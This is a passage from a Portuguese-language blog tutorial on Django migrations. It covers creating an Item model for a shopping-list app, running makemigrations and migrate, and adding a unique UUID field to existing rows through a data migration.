&lt;p&gt;Nosso &lt;em&gt;application&lt;/em&gt; terá uma estrutura similar a essa:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;lista_de_compras/
    __init__.py
    admin.py
    apps.py
    migrations/
        __init__.py
    models.py
    tests.py
    views.py&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Não esqueça de adicioná-lo ao &lt;code class=&quot;language-text&quot;&gt;INSTALLED_APPS&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Vamos nos focar na pasta &lt;code class=&quot;language-text&quot;&gt;migrations&lt;/code&gt; e no &lt;code class=&quot;language-text&quot;&gt;models.py&lt;/code&gt;. Nesse último, criaremos o modelo &lt;code class=&quot;language-text&quot;&gt;Item&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# models.py&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Item&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Model&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    nome &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;CharField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;max_length&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    quantidade &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;IntegerField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;default&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Agora, na linha de comando, invocamos o comando de criação de &lt;em&gt;migrations&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ python manage.py makemigrations&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Se tudo ocorreu bem, na pasta &lt;code class=&quot;language-text&quot;&gt;migrations&lt;/code&gt; do &lt;em&gt;app&lt;/em&gt;, um novo arquivo
&lt;a href=&quot;/tag/python.html&quot; title=&quot;Leia mais sobre Python&quot;&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; foi criado:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# migrations/0001_initial.py&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; __future__ &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; unicode_literals
&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; django&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;db &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; migrations&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; models


&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Migration&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;migrations&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Migration&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;

    initial &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;True&lt;/span&gt;

    dependencies &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;

    operations &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
        migrations&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;CreateModel&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
            name&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;Item&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            fields&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
                &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;id&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;AutoField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;auto_created&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; primary_key&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; serialize&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; verbose_name&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;ID&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;nome&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;CharField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;max_length&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;quantidade&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;IntegerField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;default&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Por partes:&lt;/p&gt;
&lt;p&gt;O &lt;code class=&quot;language-text&quot;&gt;unicode_literals&lt;/code&gt; é uma ferramenta que torna possível a execução de seu projeto em &lt;em&gt;Python&lt;/em&gt; 2 e 3.
Ela tem a função de &quot;marcar&quot; suas &lt;em&gt;strings&lt;/em&gt; como &lt;em&gt;unicode&lt;/em&gt;, como explicado na &lt;a href=&quot;https://docs.djangoproject.com/en/1.10/topics/migrations/#supporting-python-2-and-3&quot; title=&quot;Suportando Python 2 e 3&quot;&gt;documentação do &lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;É criada (automaticamente) uma classe &lt;code class=&quot;language-text&quot;&gt;Migration&lt;/code&gt; herdando de &lt;code class=&quot;language-text&quot;&gt;migrations.Migration&lt;/code&gt;. Nela, temos
3 propriedades muito importantes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;initial&lt;/code&gt;: Informamos explicitamente ao &lt;em&gt;Django&lt;/em&gt; que essa é a &lt;em&gt;migration&lt;/em&gt; inicial do &lt;em&gt;app&lt;/em&gt;. Essa
informação é importante para alguns casos, como quando é &lt;a href=&quot;https://docs.djangoproject.com/en/1.10/topics/migrations/#django.db.migrations.Migration.initial&quot; title=&quot;Leia mais na documentação do Django&quot;&gt;preciso executar o --fake-initial&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;dependencies&lt;/code&gt;: Aqui informamos as dependências da nossa &lt;em&gt;migration&lt;/em&gt;. Por exemplo, se dependermos
de outra &lt;em&gt;migration&lt;/em&gt; ou &lt;em&gt;app&lt;/em&gt;, precisamos deixar claro que há uma dependência para manter uma ordem
coerente de execução.&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;operations&lt;/code&gt;: Por fim, as operações que precisam ser executadas. No exemplo acima, estamos criando
a tabela &lt;code class=&quot;language-text&quot;&gt;lista_de_compras_item&lt;/code&gt;, com os campos &lt;code class=&quot;language-text&quot;&gt;id&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;nome&lt;/code&gt; e &lt;code class=&quot;language-text&quot;&gt;quantidade&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;No more syncdb&lt;/h2&gt;
&lt;p&gt;Calma! A tabela ainda não existe no banco dados. Para que isso aconteça é necessário executar o comando
&lt;code class=&quot;language-text&quot;&gt;migrate&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ python manage.py migrate&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;migrate&lt;/code&gt; executará todas as &lt;em&gt;migrations&lt;/em&gt; pendentes do seu projeto. Caso queira executar
apenas de um &lt;em&gt;app&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ python manage.py migrate lista_de_compras&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Evoluindo o Schema&lt;/h2&gt;
&lt;p&gt;Vamos supor que exista o requisito de criar um &lt;a href=&quot;/tag/rest.html&quot; title=&quot;Leia mais sobre REST&quot;&gt;&lt;em&gt;API REST&lt;/em&gt;&lt;/a&gt; para o projeto,
logo, expor o campo &lt;code class=&quot;language-text&quot;&gt;id&lt;/code&gt; não é uma boa prática! Precisamos de um campo único e não
sequencial, que trará um pouco de &lt;em&gt;obfuscation&lt;/em&gt; e segurança ao nosso &lt;em&gt;endpoint&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Primeiro, adicionamos o campo ao modelo:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# models.py&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Item&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Model&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    uuid &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;UUIDField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;default&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;uuid&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;uuid4&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; editable&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; unique&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    nome &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;CharField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;max_length&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    quantidade &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;IntegerField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;default&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Seguindo o procedimento, para homologar as alterações em uma &lt;em&gt;migration&lt;/em&gt;, precisamos do &lt;code class=&quot;language-text&quot;&gt;makemigrations&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ python manage.py makemigrations lista_de_compras&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Se você executar o &lt;code class=&quot;language-text&quot;&gt;migrate&lt;/code&gt; em um banco de dados vazio, provavelmente não terá nenhum problema. Mas
em um banco já existente, provavelmente uma &lt;em&gt;exception&lt;/em&gt; acontecerá. O fato é que o uso do campo &lt;code class=&quot;language-text&quot;&gt;unique&lt;/code&gt;
e o campo &lt;code class=&quot;language-text&quot;&gt;default&lt;/code&gt;, em uma &lt;em&gt;migration&lt;/em&gt;, não é tão &lt;a href=&quot;https://code.djangoproject.com/ticket/23932&quot; title=&quot;Document how to set a unique value for new fields using migrations&quot;&gt;intuitivo como parece&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;gatsby-resp-image-figure&quot; style=&quot;&quot;&gt;
    &lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 640px;&quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/886cfa7973442256a4caa2fc8bba883f/c08c5/croods-migration.jpg&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 56.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAALABQDASIAAhEBAxEB/8QAFgABAQEAAAAAAAAAAAAAAAAAAAQD/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAP/2gAMAwEAAhADEAAAAcsYlIWJB//EABcQAQEBAQAAAAAAAAAAAAAAAAEAERL/2gAIAQEAAQUCULobC1XW6b//xAAXEQEAAwAAAAAAAAAAAAAAAAAAARIT/9oACAEDAQE/Ac1Jf//EABURAQEAAAAAAAAAAAAAAAAAAAAS/9oACAECAQE/AaU//8QAGBAAAgMAAAAAAAAAAAAAAAAAARAAITH/2gAIAQEABj8C2WGF/8QAGxAAAgIDAQAAAAAAAAAAAAAAAAFBUREhMWH/2gAIAQEAAT8h5uitGrkTdHsZhtwXJGiT/9oADAMBAAIAAwAAABCwP//EABcRAQEBAQAAAAAAAAAAAAAAAAEAMWH/2gAIAQMBAT8QCbdL/8QAFxEBAAMAAAAAAAAAAAAAAAAAAAERUf/aAAgBAgEBPxCcqv/EABoQAQADAQEBAAAAAAAAAAAAAAEAESExUYH/2gAIAQEAAT8QtanSsKiI8FRnZZ4i4a4+QwXoxKIGAT//2Q==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;&amp;quot;Migrar é preciso (indiewire.com)&amp;quot;&quot;
        title=&quot;Migrar é preciso (indiewire.com)&quot;
        src=&quot;/static/886cfa7973442256a4caa2fc8bba883f/c08c5/croods-migration.jpg&quot;
        srcset=&quot;/static/886cfa7973442256a4caa2fc8bba883f/7809d/croods-migration.jpg 192w,
/static/886cfa7973442256a4caa2fc8bba883f/4ecad/croods-migration.jpg 384w,
/static/886cfa7973442256a4caa2fc8bba883f/c08c5/croods-migration.jpg 640w&quot;
        sizes=&quot;(max-width: 640px) 100vw, 640px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;
    &lt;figcaption class=&quot;gatsby-resp-image-figcaption&quot;&gt;Migrar é preciso (indiewire.com)&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Para fazer esse procedimento, vamos seguir as recomendações da &lt;a href=&quot;https://docs.djangoproject.com/en/1.10/howto/writing-migrations/#migrations-that-add-unique-fields&quot; title=&quot;Migrations that add unique fields&quot;&gt;documentação do Django&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Primeiro, removemos os atributos &lt;code class=&quot;language-text&quot;&gt;unique=True&lt;/code&gt; e &lt;code class=&quot;language-text&quot;&gt;default=uuid.uuid4&lt;/code&gt; da &lt;em&gt;migration&lt;/em&gt; recém criada, e adicionamos
o parâmetro &lt;code class=&quot;language-text&quot;&gt;null=True&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# migrations/0002_item_uuid.py&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Migration&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;migrations&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Migration&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;

    dependencies &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;lista_de_compras&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;0001_initial&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;

    operations &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
        migrations&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;AddField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
            model_name&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;item&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            name&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;uuid&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            field&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;UUIDField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;editable&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; null&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;O próximo passo é popular as linhas já existentes com &lt;code class=&quot;language-text&quot;&gt;uuids&lt;/code&gt;. Faremos isso através de &lt;em&gt;data migrations&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Data migrations&lt;/h2&gt;
&lt;p&gt;Diretamente da documentação do &lt;em&gt;Django&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Migrations that alter data are usually called “data migrations”;
they’re best written as separate migrations, sitting alongside your schema migrations.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Em alguns casos precisamos inserir ou alterar dados, de acordo com a evolução do &lt;em&gt;database&lt;/em&gt;
do nosso projeto. O &lt;em&gt;Django&lt;/em&gt; não possui nenhuma forma &quot;automática&quot; para geração de
&lt;em&gt;data migrations&lt;/em&gt;, por isso, o caminho ideal é utilizar o comando &lt;code class=&quot;language-text&quot;&gt;--empty&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ python manage.py makemigrations --empty lista_de_compras&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Com isso, uma &lt;em&gt;migration&lt;/em&gt; &quot;em branco&quot; será criada, pronta para customização:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# migrations/0003_auto_20161010_1635.py&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Migration&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;migrations&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Migration&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;

    dependencies &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;lista_de_compras&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;0002_item_uuid&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;

    operations &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Importante notar que agora o atributo &lt;code class=&quot;language-text&quot;&gt;dependencies&lt;/code&gt; está preenchido com a &lt;em&gt;migration&lt;/em&gt;
anterior à recém criada. É sempre necessário ter atenção à sua lista de dependências,
para certificar-se que o fluxo acontecerá numa ordem coerente.&lt;/p&gt;
&lt;p&gt;Criaremos a função responsável por inserir &lt;em&gt;UUIDs&lt;/em&gt; nos registros já existentes:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# migrations/0003_auto_20161010_1635.py&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; uuid

&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;gen_uuid&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;apps&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; schema_editor&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    Item &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; apps&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;get_model&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;lista_de_compras&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;Item&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    items &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; Item&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;objects&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; item &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; items&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        item&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;uuid &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; uuid&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;uuid4&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
        item&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;save&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Usamos o parâmetro &lt;code class=&quot;language-text&quot;&gt;apps&lt;/code&gt; para &quot;importar&quot; o modelo. Na sequência, utilizamos o &lt;em&gt;ORM&lt;/em&gt;
para pegar todos os items do banco de dados, iteramos por eles preenchendo o campo
&lt;code class=&quot;language-text&quot;&gt;uuid&lt;/code&gt;.&lt;/p&gt;
